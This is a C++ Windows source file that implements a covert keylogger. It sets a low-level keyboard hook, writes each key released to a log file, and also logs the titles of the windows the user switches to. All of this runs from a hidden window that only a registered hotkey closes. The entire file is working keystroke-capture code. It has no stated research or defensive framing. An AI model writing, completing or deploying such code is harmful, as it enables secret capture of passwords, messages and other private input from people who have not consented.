#include <Windows.h>
#include <string>
#include "HandleUserInputs.h"

#define maxChars 255

HandleUserInput* hUserInp;
int KeyId;


////HookProc — это заполнитель для имени, определяемого приложением.
//LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
//{
//	// process event
//	if (nCode >= 0 && wParam == WM_KEYUP) {
//		int vkCode = lParam;
//		HandleUserInput::SetKeysState();
//		std::string saveText = HandleUserInput::GetSymbol(vkCode);
//		//TODO: File Append 
//		HandleUserInput::AppendTextToFile(HandleUserInput::_filename, saveText);
//	}
//	return CallNextHookEx(NULL, nCode, wParam, lParam);
//}

//HookProc — это заполнитель для имени, определяемого приложением.
LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	std::wstring saveText;
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);


	// process event
	if (nCode >= 0 && wParam == WM_KEYUP) {
		//saveText += char(tolower(p->vkCode));

		DWORD vkCode = p->vkCode;
		hUserInp->SetKeysState();
		saveText = hUserInp->GetSymbol(vkCode);
		// 

		// 
		//TODO: File Append
		hUserInp->AppendTextToFileW(saveText);
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void CALLBACK ActiveWindowsHook(HWINEVENTHOOK hWinEventHook, DWORD eventType, HWND hWnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime)
{
	//std::FILE.AppendAllTExt
	//TODO: FILE APPEND
	//char str[maxChars];
	//sprintf_s(str, "%s %s %s", "\n", (char*)hUserInp->GetActiveWindowTitle(), "\n");
	//hUserInp->AppendTextToFile(str);

	std::wstring str(hUserInp->GetActiveWindowTitle());
	str += L"\n";
	hUserInp->AppendTextToFileW(str);
}


LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)

{
	switch (uMsg)
	{
	case WM_CLOSE:
		DestroyWindow(hWnd);
		break;
	case WM_HOTKEY:
		if (wParam == KeyId)
		{
			UnregisterHotKey(hWnd, KeyId);
			DestroyWindow(hWnd);
		}
		break;

	default:
		return DefWindowProc(hWnd, uMsg, wParam, lParam);
	}

	return 0;
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR pCmdLine, int nCmdShow)
{
	const wchar_t ClassName[] = L"HiddenWindow";
	WNDCLASS wc = {};

	wc.lpfnWndProc = WindowProc;
	wc.hInstance = hInstance;
	wc.lpszClassName = ClassName;

	RegisterClass(&wc);

	HWND hWnd = CreateWindowExW(0, ClassName, L"HiddenWnd", 0, 0, 0, 0, 0, 0, 0, hInstance, 0);

	if (hWnd == NULL) {
		return 0;
	}

	hUserInp = new HandleUserInput(hWnd);


	//hUserInp->HookId = hUserInp->SetHook(WH_KEYBOARD_LL, &HookProc);
	hUserInp->HookId = hUserInp->SetHook(WH_KEYBOARD_LL, &HookProc, GetCurrentThreadId());
	if (hUserInp->HookId == NULL)
	{
		hUserInp->AppendTextToFileW(L"Failed to set hook\n");
		return 0;
	}
	else
	{
		hUserInp->AppendTextToFileW(L"Hook setted successfully\n");
	}
	//HandleUserInputsService.WindowHookId = _handleUserInputsService.SetWinHook(HandleUserInputsService.ActiveWindowsHook);

	hUserInp->WindowHookId = hUserInp->SetWinHook(&ActiveWindowsHook);
	if (hUserInp->WindowHookId == NULL)
	{
		hUserInp->AppendTextToFileW(L"Failed to set WindowHook\n");
		return 0;
	}
	else
	{
		hUserInp->AppendTextToFileW(L"WindowHook setted successfully\n");
	}

	//hUserInp->HookId = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, 0, &HookProc, 0, 0, WINEVENT_OUTOFCONTEXT);
	//hUserInp->HookId = hUserInp->SetWinHook(&HandleUserInput::HookProc);

	ShowWindow(hWnd, SW_HIDE);

	MSG msg = {};
	while (GetMessage(&msg, NULL, 0, 0)) {
		//DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(hUserInp->HookId);
	UnhookWinEvent(hUserInp->WindowHookId);
	return 0;
}
